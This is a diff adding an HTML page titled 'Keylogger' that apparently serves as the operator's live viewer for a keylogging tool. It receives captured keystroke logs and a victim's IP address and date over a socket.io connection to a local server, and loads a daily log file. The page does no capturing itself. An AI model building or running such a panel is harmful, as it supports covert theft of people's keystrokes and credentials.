@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Keylogger</title>
+</head>
+<body style="color:white;background: black">
+<h1>Today's live channel</h1>
+<div id="ip"></div>
+<div style=" font-family: Consolas; width:100%; word-break: break-word" id="reader">
+</div>
+</body>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.4.1/socket.io.js"></script>
+
+<script>
+
+    const socket = io.connect('http://localhost:3000', {
+        transports: ['websocket']
+    });
+
+    socket.on('connect', () => {
+        console.log('Connected to server');
+    });
+
+    socket.on('log', function(data) {
+        console.log(data);
+        const reader = document.getElementById('reader');
+        reader.innerHTML += data;
+    });
+
+    socket.on('ip', function(data) {
+        document.getElementById('ip').innerHTML = `<h3>${data.ip}</h3><p>${data.date}</p> `
+    });
+
+    fetch(`../${new Date().getDate()}${new Date().getMonth()}${new Date().getFullYear()}.txt`)
+        .then(response => response.text())
+        .then(data => document.getElementById('reader').innerHTML=data)
+        .catch(error => console.error(error));
+</script>
+</html>
